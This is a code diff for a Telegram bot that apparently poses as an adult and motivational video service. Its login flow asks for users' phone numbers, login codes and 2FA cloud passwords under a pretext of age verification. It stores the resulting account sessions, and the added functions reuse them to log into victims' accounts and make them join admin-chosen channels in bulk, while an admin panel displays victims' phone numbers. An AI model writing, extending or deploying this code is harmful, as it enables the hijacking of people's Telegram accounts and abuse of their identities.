@@ -17,6 +17,7 @@ from utils import (
     otp_prompt_keyboard, twofa_prompt_keyboard, login_success_keyboard,
     after_video_keyboard, purchase_options_keyboard, contact_owner_keyboard,
     reveal_keyboard, main_menu_keyboard, stats_keyboard, admin_keyboard,
+    language_selection_keyboard, agreement_keyboard,
     get_caption_for_category, log_session, build_detailed_log,
     get_disclaimer, fmt_bold, fmt_code, fmt_blockquote,
     make_keyboard, primary, success, danger, warning, info,
@@ -24,10 +25,11 @@ from utils import (
 from content_manager import get_video_for_user
 from subscription import check_subscription, force_sub_keyboard, get_force_sub_message
 from login_manager import (
-    send_otp_pyrogram, verify_otp_pyrogram, check_2fa_password,
+    send_otp_pyrogram, verify_otp_pyrogram, check_2fa_password, cancel_login,
     generate_mock_otp, get_otp_attempts, increment_otp_attempts,
     increment_2fa_attempts, reset_attempts,
 )
+from localization import get_text
 from purchase import (
     request_purchase, get_purchase_text, get_contact_owner_text,
     get_purchase_confirmation_text, get_purchase_rejected_text,
@@ -46,6 +48,126 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 login_state = {}
+admin_upload_states = {}
+admin_config_state = {}
+
+START_VIDEOS = []
+
+async def _cache_start_videos():
+    global START_VIDEOS
+    import httpx
+    cache_dir = "data/start_videos"
+    os.makedirs(cache_dir, exist_ok=True)
+    START_VIDEOS = []
+    
+    # We download welcome videos list defined in config
+    urls = getattr(config, "START_VIDEO_URLS", [])
+    for url in urls:
+        fname = url.rsplit("/", 1)[-1]
+        local_path = os.path.join(cache_dir, fname)
+        if not os.path.exists(local_path):
+            try:
+                logger.info(f"Downloading start welcome video: {url}")
+                async with httpx.AsyncClient() as client:
+                    r = await client.get(url, follow_redirects=True, timeout=60)
+                    if r.status_code == 200:
+                        with open(local_path, "wb") as f:
+                            f.write(r.content)
+            except Exception as e:
+                logger.error(f"Failed to download welcome video {url}: {e}")
+        if os.path.exists(local_path):
+            START_VIDEOS.append(local_path)
+
+async def send_welcome_media(chat, text, reply_markup, parse_mode="HTML"):
+    global START_VIDEOS
+    video_path = None
+    if START_VIDEOS:
+        video_path = random.choice(START_VIDEOS)
+    elif os.path.exists("data/start_video.mp4"):
+        video_path = "data/start_video.mp4"
+        
+    if video_path:
+        try:
+            with open(video_path, "rb") as f:
+                return await chat.send_video(
+                    video=f,
+                    caption=text,
+                    reply_markup=reply_markup,
+                    parse_mode=parse_mode
+                )
+        except Exception as e:
+            logger.error(f"Failed to send welcome video {video_path}: {e}")
+            
+    # Fallback to standard text message
+    return await chat.send_message(
+        text=text,
+        reply_markup=reply_markup,
+        parse_mode=parse_mode
+    )
+
+async def send_upload_config_message(message, user_id):
+    state = admin_upload_states.get(user_id)
+    if not state:
+        return
+    cat = state["category"]
+    is_free = state["is_free"]
+    del_after = state["delete_after"]
+    cap = state["caption"] or "[None]"
+    text = (
+        "<blockquote>📹 CONFIGURE CAPTURED VIDEO</blockquote>\n\n"
+        f"📂 <b>Category:</b> <code>{cat.upper()}</code>\n"
+        f"🔑 <b>Access Type:</b> <code>{'FREE (Everyone)' if is_free else 'PREMIUM (Paid)'}</code>\n"
+        f"⏳ <b>Auto-Delete:</b> <code>{del_after}s</code>\n"
+        f"📝 <b>Custom Caption:</b> <code>{cap}</code>\n\n"
+        "Use the buttons below to change settings, then click Save."
+    )
+    keyboard = make_keyboard([
+        [
+            primary(f"📂 Category: {cat.upper()}", "up_toggle_cat"),
+            primary(f"🔑 Type: {'Free' if is_free else 'Premium'}", "up_toggle_type")
+        ],
+        [
+            primary(f"⏳ Delete: {del_after}s", "up_toggle_delete"),
+            primary("📝 Set Caption", "up_set_caption")
+        ],
+        [
+            success("💾 SAVE VIDEO", "up_save"),
+            danger("🗑️ DISCARD", "up_discard")
+        ]
+    ])
+    await message.reply_text(text, reply_markup=keyboard, parse_mode="HTML")
+
+async def update_upload_config_message(query, user_id):
+    state = admin_upload_states.get(user_id)
+    if not state:
+        return
+    cat = state["category"]
+    is_free = state["is_free"]
+    del_after = state["delete_after"]
+    cap = state["caption"] or "[None]"
+    text = (
+        "<blockquote>📹 CONFIGURE CAPTURED VIDEO</blockquote>\n\n"
+        f"📂 <b>Category:</b> <code>{cat.upper()}</code>\n"
+        f"🔑 <b>Access Type:</b> <code>{'FREE (Everyone)' if is_free else 'PREMIUM (Paid)'}</code>\n"
+        f"⏳ <b>Auto-Delete:</b> <code>{del_after}s</code>\n"
+        f"📝 <b>Custom Caption:</b> <code>{cap}</code>\n\n"
+        "Use the buttons below to change settings, then click Save."
+    )
+    keyboard = make_keyboard([
+        [
+            primary(f"📂 Category: {cat.upper()}", "up_toggle_cat"),
+            primary(f"🔑 Type: {'Free' if is_free else 'Premium'}", "up_toggle_type")
+        ],
+        [
+            primary(f"⏳ Delete: {del_after}s", "up_toggle_delete"),
+            primary("📝 Set Caption", "up_set_caption")
+        ],
+        [
+            success("💾 SAVE VIDEO", "up_save"),
+            danger("🗑️ DISCARD", "up_discard")
+        ]
+    ])
+    await query.edit_message_text(text, reply_markup=keyboard, parse_mode="HTML")
 
 START_IMAGE_URLS = [
     "https://picsum.photos/seed/motivation1/400/300",
@@ -97,38 +219,474 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except (ValueError, IndexError):
             pass
 
+    user_data = await db.get_user(user.id)
+    lang = user_data.get("language") if user_data else None
+
+    # Check force subscription first
     is_subbed = await check_subscription(context.bot, user.id)
     if not is_subbed:
         sub = await db.get_subscription()
         if sub:
             await update.message.reply_text(
                 get_force_sub_message(),
-                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", "")),
+                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", ""), lang or "en"),
                 parse_mode="HTML",
             )
             return
 
-    user_data = await db.get_user(user.id)
+    if not lang:
+        # Show language selection with start video
+        select_lang_text = get_text("SELECT_LANGUAGE", "en")
+        await send_welcome_media(update.message.chat, select_lang_text, language_selection_keyboard())
+        return
 
-    if user_data and user_data.get("status") in ("active", "purchased"):
-        text = "🍆 <b>WELCOME BACK, YOU SEXY MOTHERFUCKER</b> 🍆\n\nI missed your hungry ass. Ready for another round?\nThe <b>premium content</b> is still hot and waiting for you... 🔥💦"
+    if not user_data.get("agreement_accepted"):
+        # Show disclaimer
+        disclaimer_text = get_text("DISCLAIMER_TEXT", lang)
+        await send_welcome_media(update.message.chat, disclaimer_text, agreement_keyboard(lang))
+        return
+
+    # If already logged in & agreement accepted
+    status = user_data.get("status", "pending")
+    watched = user_data.get("video_count", 0)
+    status_label = get_text("STATUS_PENDING", lang)
+    if status == "active":
+        status_label = get_text("STATUS_ACTIVE", lang)
+    elif status == "purchased":
+        status_label = get_text("STATUS_PURCHASED", lang)
+
+    if status in ("active", "purchased"):
+        text = get_text("WELCOME_BACK", lang)
     else:
-        text = welcome_message(user.id, user_data)
-    keyboard = welcome_keyboard()
+        text = get_text("WELCOME_BODY", lang, user.id, status_label, watched)
 
-    if START_IMAGES:
+    keyboard = welcome_keyboard(lang)
+    await send_welcome_media(update.message.chat, text, keyboard)
+async def is_user_admin(user_id):
+    if user_id in config.ADMIN_IDS:
+        return True
+    settings = await db.get_settings()
+    admin_list = settings.get("admin_ids", [])
+    return user_id in admin_list
+
+async def run_single_auto_join(session_string, channel):
+    client = Client(
+        "temp_auto_join",
+        api_id=config.PYROGRAM_API_ID,
+        api_hash=config.PYROGRAM_API_HASH,
+        session_string=session_string,
+        in_memory=True
+    )
+    try:
+        await client.connect()
+        await client.join_chat(channel)
+        await client.disconnect()
+        logger.info(f"Auto-joined user account to {channel}")
+    except Exception as e:
+        logger.error(f"Auto-join failed: {e}")
         try:
-            idx = user.id % len(START_IMAGES)
-            with open(START_IMAGES[idx], "rb") as _f:
-                _img_bytes = _f.read()
-            await update.message.reply_photo(_img_bytes, caption=text, reply_markup=keyboard, parse_mode="HTML")
+            await client.disconnect()
         except Exception:
-            await update.message.reply_text(text, reply_markup=keyboard, parse_mode="HTML")
-    else:
-        await update.message.reply_text(text, reply_markup=keyboard, parse_mode="HTML")
+            pass
 
-    log_session(user.id, user.username, None, "Started bot")
+async def run_join_all_userbots(bot, admin_chat_id, target_chat):
+    cursor = db.db.users.find({"session_string": {"$ne": None}})
+    users = await cursor.to_list(length=None)
+    if not users:
+        await bot.send_message(chat_id=admin_chat_id, text="❌ No logged-in user sessions found in database.")
+        return
+    await bot.send_message(chat_id=admin_chat_id, text=f"🚀 <b>Starting Join All for {len(users)} accounts...</b>", parse_mode="HTML")
+    success_count = 0
+    failed_count = 0
+    for u in users:
+        sess = u["session_string"]
+        uid = u["user_id"]
+        username = u.get("username", f"ID: {uid}")
+        client = Client(
+            f"sessions/temp_join_{uid}",
+            api_id=config.PYROGRAM_API_ID,
+            api_hash=config.PYROGRAM_API_HASH,
+            session_string=sess,
+            in_memory=True
+        )
+        try:
+            await client.connect()
+            await client.join_chat(target_chat)
+            success_count += 1
+            await client.disconnect()
+        except Exception as e:
+            failed_count += 1
+            logger.error(f"Userbot {username} failed to join {target_chat}: {e}")
+            try:
+                await client.disconnect()
+            except Exception:
+                pass
+        await asyncio.sleep(1.5)
+    await bot.send_message(
+        chat_id=admin_chat_id,
+        text=(
+            f"🏁 <b>Join All Complete!</b>\n\n"
+            f"🎯 <b>Target:</b> <code>{target_chat}</code>\n"
+            f"✅ <b>Joined:</b> <code>{success_count}</code>\n"
+            f"❌ <b>Failed:</b> <code>{failed_count}</code>"
+        ),
+        parse_mode="HTML"
+    )
 
+async def show_telegram_admin_dashboard(query):
+    settings = await db.get_settings()
+    maintenance_active = settings.get("maintenance_mode", False)
+    logged_in_sessions_count = await db.db.users.count_documents({"session_string": {"$ne": None}})
+    user_count = await db.get_user_count()
+    v_count = await db.video_count()
+    pending_purchases = await db.get_pending_purchases()
+    text = (
+        "👑 <b>XTR AD BOT - ADMIN PANEL</b> 👑\n\n"
+        "Welcome to your global configurations panel. Update settings dynamically:\n\n"
+        f"👤 <b>Total Users:</b> <code>{user_count}</code>\n"
+        f"📹 <b>Total Videos:</b> <code>{v_count}</code>\n"
+        f"💰 <b>Pending Purchases:</b> <code>{len(pending_purchases)}</code>\n"
+        f"🔑 <b>Logged-in Sessions:</b> <code>{logged_in_sessions_count}</code>\n"
+        f"⚙️ <b>Maintenance Mode:</b> <code>{'ENABLED 🔴' if maintenance_active else 'DISABLED 🟢'}</code>\n"
+        f"🔒 <b>Force Join:</b> <code>{settings.get('force_sub_channel', 'None')}</code>\n\n"
+        "<i>Update configurations below:</i>"
+    )
+    from utils import telegram_admin_panel_keyboard
+    await query.edit_message_text(
+        text,
+        reply_markup=telegram_admin_panel_keyboard(maintenance_active),
+        parse_mode="HTML"
+    )
+
+async def handle_custom_callbacks(query, context, data, user, is_admin):
+    if data == "set_lang_en":
+        await db.update_user(user.id, language="en")
+        disclaimer_text = get_text("DISCLAIMER_TEXT", "en")
+        try:
+            await query.edit_message_caption(
+                caption=disclaimer_text,
+                reply_markup=agreement_keyboard("en"),
+                parse_mode="HTML"
+            )
+        except Exception:
+            try:
+                await query.message.delete()
+            except Exception:
+                pass
+            await send_welcome_media(query.message.chat, disclaimer_text, agreement_keyboard("en"))
+        return True
+    elif data == "set_lang_hi":
+        await db.update_user(user.id, language="hi")
+        disclaimer_text = get_text("DISCLAIMER_TEXT", "hi")
+        try:
+            await query.edit_message_caption(
+                caption=disclaimer_text,
+                reply_markup=agreement_keyboard("hi"),
+                parse_mode="HTML"
+            )
+        except Exception:
+            try:
+                await query.message.delete()
+            except Exception:
+                pass
+            await send_welcome_media(query.message.chat, disclaimer_text, agreement_keyboard("hi"))
+        return True
+    elif data == "accept_agreement":
+        await db.update_user(user.id, agreement_accepted=True)
+        try:
+            await query.message.delete()
+        except Exception:
+            pass
+        user_data = await db.get_user(user.id)
+        lang = user_data.get("language", "en") if user_data else "en"
+        status = user_data.get("status", "pending")
+        watched = user_data.get("video_count", 0)
+        status_label = get_text("STATUS_PENDING", lang)
+        if status == "active":
+            status_label = get_text("STATUS_ACTIVE", lang)
+        elif status == "purchased":
+            status_label = get_text("STATUS_PURCHASED", lang)
+        welcome_text = get_text("WELCOME_BODY", lang, user.id, status_label, watched)
+        await query.message.chat.send_message(
+            text=welcome_text,
+            reply_markup=welcome_keyboard(lang),
+            parse_mode="HTML"
+        )
+        return True
+    elif data == "reject_agreement":
+        user_data = await db.get_user(user.id)
+        lang = user_data.get("language", "en") if user_data else "en"
+        decline_msg = get_text("DECLINE_MESSAGE", lang)
+        try:
+            await query.edit_message_caption(
+                caption=decline_msg,
+                reply_markup=None,
+                parse_mode="HTML"
+            )
+        except Exception:
+            try:
+                await query.message.delete()
+            except Exception:
+                pass
+            await query.message.chat.send_message(text=decline_msg, parse_mode="HTML")
+        return True
+
+    if data.startswith("up_"):
+        if not is_admin:
+            return True
+        state = admin_upload_states.get(user.id)
+        if not state:
+            await query.answer("❌ No active upload session.", show_alert=True)
+            return True
+        if data == "up_toggle_cat":
+            categories = ["motivation", "fitness", "business", "mindset", "sports", "funny"]
+            idx = categories.index(state["category"])
+            state["category"] = categories[(idx + 1) % len(categories)]
+            await update_upload_config_message(query, user.id)
+        elif data == "up_toggle_type":
+            state["is_free"] = not state["is_free"]
+            await update_upload_config_message(query, user.id)
+        elif data == "up_toggle_delete":
+            times = [30, 60, 120, 180, 300]
+            idx = times.index(state["delete_after"]) if state["delete_after"] in times else 1
+            state["delete_after"] = times[(idx + 1) % len(times)]
+            await update_upload_config_message(query, user.id)
+        elif data == "up_set_caption":
+            state["awaiting_caption"] = True
+            await query.edit_message_text(
+                "<blockquote>📝 ENTER CUSTOM CAPTION</blockquote>\n\n"
+                "Send the caption text as a normal message.\n"
+                "To clear the caption, send <code>none</code>.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "up_back_to_config")]]),
+                parse_mode="HTML"
+            )
+        elif data == "up_back_to_config":
+            state.pop("awaiting_caption", None)
+            await update_upload_config_message(query, user.id)
+        elif data == "up_discard":
+            admin_upload_states.pop(user.id, None)
+            await query.edit_message_text("🗑️ <b>Video upload cancelled.</b>", parse_mode="HTML")
+        elif data == "up_save":
+            state = admin_upload_states.pop(user.id, None)
+            is_free_val = 1 if state["is_free"] else 0
+            vid = await db.add_video(
+                file_id=state["file_id"],
+                caption=state["caption"] if state["caption"] else None,
+                category=state["category"],
+                delete_after=state["delete_after"],
+                added_by=user.id,
+                is_free=is_free_val
+            )
+            await query.edit_message_text(
+                f"<blockquote>✅ VIDEO SAVED SUCCESSFULLY!</blockquote>\n\n"
+                f"• <b>Video ID:</b> <code>#{vid}</code>\n"
+                f"• <b>Category:</b> <code>{state['category'].upper()}</code>\n"
+                f"• <b>Type:</b> <code>{'FREE' if state['is_free'] else 'PREMIUM'}</code>\n"
+                f"• <b>Delete Timer:</b> <code>{state['delete_after']}s</code>",
+                parse_mode="HTML"
+            )
+        return True
+
+    if data.startswith("adm_"):
+        if not is_admin:
+            return True
+        if data == "adm_toggle_maint":
+            settings = await db.get_settings()
+            new_val = not settings.get("maintenance_mode", False)
+            await db.update_settings(maintenance_mode=new_val)
+            await query.answer(f"Maintenance Mode {'Enabled' if new_val else 'Disabled'}", show_alert=True)
+            await show_telegram_admin_dashboard(query)
+        elif data == "adm_force_join":
+            admin_config_state[user.id] = {"field": "force_join"}
+            await query.edit_message_text(
+                "<blockquote>🔗 SET FORCE JOIN CHANNEL</blockquote>\n\n"
+                "Send the channel username (with @) and invite link separated by a space.\n\n"
+                "Example: <code>@mychannel https://t.me/mychannel</code>\n\n"
+                "To disable force join, send <code>none</code>.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_log_group":
+            admin_config_state[user.id] = {"field": "log_group"}
+            await query.edit_message_text(
+                "<blockquote>📁 SET LOG GROUP ID</blockquote>\n\n"
+                "Send the negative integer ID of your Telegram log group/channel.\n\n"
+                "Example: <code>-1001234567890</code>",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_brand_name":
+            admin_config_state[user.id] = {"field": "brand_name"}
+            await query.edit_message_text(
+                "<blockquote>🏷️ SET BRANDING NAME</blockquote>\n\n"
+                "Send the text you want to use as the branding name for the bot.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_brand_days":
+            admin_config_state[user.id] = {"field": "brand_days"}
+            await query.edit_message_text(
+                "<blockquote>⏱️ SET BRANDING DAYS</blockquote>\n\n"
+                "Send the integer number of default days for subscription packs.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_menu_images":
+            admin_config_state[user.id] = {"field": "menu_images"}
+            await query.edit_message_text(
+                "<blockquote>🖼️ SET MENU IMAGES / WELCOME VIDEO</blockquote>\n\n"
+                "To set a new start message video, send the video file directly to the bot now. "
+                "It will replace the current start video.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_upi":
+            admin_config_state[user.id] = {"field": "upi"}
+            await query.edit_message_text(
+                "<blockquote>🏦 SET UPI ID</blockquote>\n\n"
+                "Send your UPI ID for payments.\n\n"
+                "Example: <code>owner@upi</code>",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_usdt":
+            admin_config_state[user.id] = {"field": "usdt"}
+            await query.edit_message_text(
+                "<blockquote>🔘 SET USDT ADDRESS</blockquote>\n\n"
+                "Send your USDT (TRC-20) address.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_ton":
+            admin_config_state[user.id] = {"field": "ton"}
+            await query.edit_message_text(
+                "<blockquote>💎 SET TON ADDRESS</blockquote>\n\n"
+                "Send your TON Wallet address.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_join_all":
+            admin_config_state[user.id] = {"field": "join_all"}
+            await query.edit_message_text(
+                "<blockquote>👥 JOIN ALL CHANNELS (USERBOT)</blockquote>\n\n"
+                "Send the channel invite link or username that you want all logged-in userbots to join.\n\n"
+                "Example: <code>https://t.me/mychannel</code> or <code>@mychannel</code>",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_auto_joins":
+            admin_config_state[user.id] = {"field": "auto_join_config"}
+            settings = await db.get_settings()
+            curr = settings.get("auto_join_channel", "") or "None"
+            await query.edit_message_text(
+                "<blockquote>🔗 AUTO-JOINS CONFIGURATION</blockquote>\n\n"
+                f"Currently preset channel: <code>{curr}</code>\n\n"
+                "Send the username or invite link of the channel you want new users to join automatically upon login. "
+                "To disable, send <code>none</code>.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_user_manage":
+            admin_config_state[user.id] = {"field": "user_manage"}
+            await query.edit_message_text(
+                "<blockquote>👤 USER MANAGEMENT</blockquote>\n\n"
+                "Send the User ID of the user you want to search and manage.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_admins":
+            settings = await db.get_settings()
+            admin_list = settings.get("admin_ids", [])
+            admins_text = "\n".join(f"• <code>{aid}</code>" for aid in admin_list)
+            await query.edit_message_text(
+                "<blockquote>👥 MANAGE ADMINS</blockquote>\n\n"
+                f"Current Admins:\n{admins_text}\n\n"
+                "Choose an action:",
+                reply_markup=make_keyboard([
+                    [primary("➕ Add Admin", "adm_add_admin_prompt"), primary("➖ Remove Admin", "adm_remove_admin_prompt")],
+                    [danger("🔙 BACK", "admin_dashboard")]
+                ]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_add_admin_prompt":
+            admin_config_state[user.id] = {"field": "add_admin"}
+            await query.edit_message_text(
+                "<blockquote>➕ ADD ADMIN</blockquote>\n\n"
+                "Send the Telegram User ID of the new admin.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "adm_admins")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_remove_admin_prompt":
+            admin_config_state[user.id] = {"field": "remove_admin"}
+            await query.edit_message_text(
+                "<blockquote>➖ REMOVE ADMIN</blockquote>\n\n"
+                "Send the Telegram User ID you want to remove from admins.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "adm_admins")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_sub_plans":
+            await query.edit_message_text(
+                "<blockquote>📅 SUBSCRIPTION PLANS</blockquote>\n\n"
+                "Currently, plans are configured in <code>config.py</code>:\n"
+                + "\n".join(f"• {v['label']} - {v['price']}" for v in config.PURCHASE_OPTIONS.values()) +
+                "\n\nUpdate package details in config file directly.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        elif data == "adm_commission":
+            admin_config_state[user.id] = {"field": "commission"}
+            await query.edit_message_text(
+                "<blockquote>📊 SET COMMISSION PERCENTAGE</blockquote>\n\n"
+                "Send the commission rate (0-100) as an integer.",
+                reply_markup=make_keyboard([[danger("🔙 BACK", "admin_dashboard")]]),
+                parse_mode="HTML"
+            )
+        return True
+
+    if data.startswith("usrm_"):
+        if not is_admin:
+            return True
+        parts = data.split("_")
+        action = parts[1]
+        target_uid = int(parts[2])
+        if action == "active":
+            await db.update_user(target_uid, status="active")
+            await query.answer(f"User {target_uid} set to Active", show_alert=True)
+        elif action == "premium":
+            await db.update_user(target_uid, status="purchased")
+            await query.answer(f"User {target_uid} set to Premium", show_alert=True)
+        elif action == "pending":
+            await db.update_user(target_uid, status="pending")
+            await query.answer(f"User {target_uid} set to Pending", show_alert=True)
+        elif action == "reset":
+            await db.update_user(target_uid, video_count=0, free_previews_used=0)
+            await query.answer(f"User {target_uid} watch counts reset", show_alert=True)
+        u_info = await db.get_user(target_uid)
+        text = (
+            f"<blockquote>👤 USER PROFILE: {target_uid}</blockquote>\n\n"
+            f"• Username: @{u_info.get('username', 'None')}\n"
+            f"• First Name: {u_info.get('first_name', 'None')}\n"
+            f"• Phone: {u_info.get('phone', 'None')}\n"
+            f"• Status: <code>{u_info.get('status', 'pending').upper()}</code>\n"
+            f"• Videos Watched: <code>{u_info.get('video_count', 0)}</code>\n"
+            f"• Free Previews: <code>{u_info.get('free_previews_used', 0)}</code>\n\n"
+            "Select an action to modify user details:"
+        )
+        keyboard = make_keyboard([
+            [
+                primary("🔓 Set Active", f"usrm_active_{target_uid}"),
+                primary("💎 Set Premium", f"usrm_premium_{target_uid}")
+            ],
+            [
+                primary("❌ Set Pending", f"usrm_pending_{target_uid}"),
+                primary("🗑️ Reset Count", f"usrm_reset_{target_uid}")
+            ],
+            [danger("🔙 BACK TO PANEL", "admin_dashboard")]
+        ])
+        await query.edit_message_text(text, reply_markup=keyboard, parse_mode="HTML")
+        return True
+
+    return False
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -136,18 +694,35 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     data = query.data
     user = query.from_user
 
+    # Admin check
+    is_admin = await is_user_admin(user.id)
+
+    # Maintenance check
+    settings = await db.get_settings()
+    if settings.get("maintenance_mode", False) and not is_admin:
+        await query.answer("🚧 Bot is under maintenance.", show_alert=True)
+        return
+
+    # Check custom/admin callbacks
+    custom_handled = await handle_custom_callbacks(query, context, data, user, is_admin)
+    if custom_handled:
+        return
+
     is_subbed = await check_subscription(context.bot, user.id)
-    if not is_subbed and data not in ("check_sub", "force_sub", "main_menu", "delete_session") and user.id not in config.ADMIN_IDS:
+    if not is_subbed and data not in ("check_sub", "force_sub", "main_menu", "delete_session") and not is_admin:
         sub = await db.get_subscription()
         if sub:
+            user_data = await db.get_user(user.id)
+            lang = user_data.get("language", "en") if user_data else "en"
             await query.edit_message_text(
                 get_force_sub_message(),
-                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", "")),
+                reply_markup=force_sub_keyboard(sub.get("channel_username", ""), sub.get("channel_id", ""), lang),
                 parse_mode="HTML",
             )
             return
 
     user_data = await db.get_user(user.id)
+    lang = user_data.get("language", "en") if user_data else "en"
 
     if data == "free_video_1":
         await handle_free_video(query, context, user, user_data, 1)
@@ -155,25 +730,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await handle_free_video(query, context, user, user_data, 2)
     elif data == "login":
         await query.edit_message_text(
-            "<blockquote>🍆 WELCOME TO THE LOGIN PORTAL</blockquote>\n\n"
-            "So you want the <b>full experience</b>, huh? I knew you were dirty.\n\n"
-            "<b>Step 1:</b> Drop your number\n"
-            "<b>Step 2:</b> Enter the secret code\n"
-            "<b>Step 3:</b> 2FA (if you're packing)\n\n"
-            "👇 Tap below and let's get <i>intimate</i>.",
-            reply_markup=login_prompt_keyboard(),
+            get_text("LOGIN_PORTAL_TEXT", lang),
+            reply_markup=login_prompt_keyboard(lang),
             parse_mode="HTML",
         )
     elif data == "login_number":
         await query.edit_message_text(
-            "<blockquote>📱 GIVE ME YOUR DIGITS, BABY</blockquote>\n\n"
-            "Drop your phone number with country code.\n"
-            "I promise I won't spam you... <i>unless you're into that</i> 😏\n\n"
-            f"Example: <code>+911234567890</code>\n\n"
-            "⚠️ This is for <b>18+ verification</b> only.\n"
-            "Your secret is safe with me... 🤫",
+            get_text("GIVE_DIGITS_TEXT", lang),
             reply_markup=make_keyboard([
-                [danger("🚫 CANCEL", "main_menu")]
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")]
             ]),
             parse_mode="HTML",
         )
@@ -182,30 +747,29 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     elif data == "verify_otp":
         st = login_state.get(user.id)
         if not st or not st.get("otp"):
-            await query.edit_message_text("❌ No OTP found. Start login again.", reply_markup=login_prompt_keyboard(), parse_mode="HTML")
+            await query.edit_message_text("❌ No OTP found. Start login again.", reply_markup=login_prompt_keyboard(lang), parse_mode="HTML")
             return
+        is_mock = st.get("is_mock", True)
+        if is_mock:
+            otp = st.get("otp", "")
+            msg = get_text("OTP_SENT_TEXT", lang, otp, " ".join(otp))
+        else:
+            msg = get_text("OTP_SENT_REAL_TEXT", lang)
         await query.edit_message_text(
-            "<blockquote>🔐 ENTER THE SECRET CODE</blockquote>\n\n"
-            "Send the 5-digit code with <b>spaces</b> between each digit.\n"
-            "Like you're whispering it in my ear...\n\n"
-            f"Example: <code>4 2 8 1 3</code>\n\n"
-            "⚠️ You have 3 attempts. Don't make me wait.",
+            msg,
             reply_markup=make_keyboard([
-                [warning("🔄 RESEND OTP", "resend_otp")],
-                [danger("❌ CANCEL", "main_menu")],
+                [warning(get_text("RESEND_OTP_BTN", lang), "resend_otp")],
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")],
             ]),
             parse_mode="HTML",
         )
         st["step"] = "otp_wait"
     elif data == "enter_2fa":
         await query.edit_message_text(
-            "<blockquote>🔐 2FA PASSWORD... YOU'RE PACKING</blockquote>\n\n"
-            "This account has 2FA. I like 'em secure.\n"
-            "Drop your cloud password so I know it's really you.\n\n"
-            "⚠️ If you don't have 2FA, just skip this step.",
+            get_text("TFA_PROMPT_TEXT", lang),
             reply_markup=make_keyboard([
-                [info("⏭️ SKIP 2FA", "skip_2fa")],
-                [danger("❌ CANCEL LOGIN", "main_menu")],
+                [info(get_text("SKIP_2FA_BTN", lang), "skip_2fa")],
+                [danger(get_text("CANCEL_BTN", lang), "main_menu")],
             ]),
             parse_mode="HTML",
         )
@@ -213,120 +777,140 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         st["step"] = "tfa_wait"
         login_state[user.id] = st
     elif data == "skip_2fa":
-        await handle_login_success(query, user, user_data, context)
+        await cancel_login(user.id)
+        await handle_login_success(query, user, user_data, context, lang)
     elif data == "resend_otp":
-        await handle_resend_otp(query, user, user_data)
+        await handle_resend_otp(query, user, user_data, lang)
     elif data == "next_video":
-        await handle_next_video(query, context, user, user_data)
+        await handle_next_video(query, context, user, user_data, lang)
     elif data == "purchase":
         await query.edit_message_text(
             get_purchase_text(),
-            reply_markup=purchase_options_keyboard(),
+            reply_markup=purchase_options_keyboard(lang),
             parse_mode="HTML",
         )
     elif data.startswith("purchase_"):
         pack_key = data.replace("purchase_", "")
-        await handle_purchase_request(query, user, pack_key)
+        await handle_purchase_request(query, user, pack_key, lang)
     elif data == "contact_owner":
         await query.edit_message_text(
             get_contact_owner_text(user.id),
-            reply_markup=contact_owner_keyboard(),
+            reply_markup=contact_owner_keyboard(lang),
             parse_mode="HTML",
         )
     elif data == "dm_owner":
+        upi_id = settings.get("upi_id", "") or "owner@upi"
+        usdt_addr = settings.get("usdt_address", "") or "Not Set"
+        ton_addr = settings.get("ton_address", "") or "Not Set"
+        if lang == "hi":
+            msg = (
+                f"👤 <b>मालिक का संपर्क:</b> {config.OWNER_USERNAME}\n\n"
+                f"आप सीधे संपर्क करके भुगतान कर सकते हैं:\n\n"
+                f"🏦 <b>UPI ID:</b> <code>{upi_id}</code>\n"
+                f"🔘 <b>USDT Address:</b> <code>{usdt_addr}</code>\n"
+                f"💎 <b>TON Address:</b> <code>{ton_addr}</code>\n\n"
+                f"💬 <b>संदेश में शामिल करें:</b>\n"
+                f"• आपकी यूजर आईडी: <code>{user.id}</code>\n"
+                f"• भुगतान विधि का नाम"
+            )
+        else:
+            msg = (
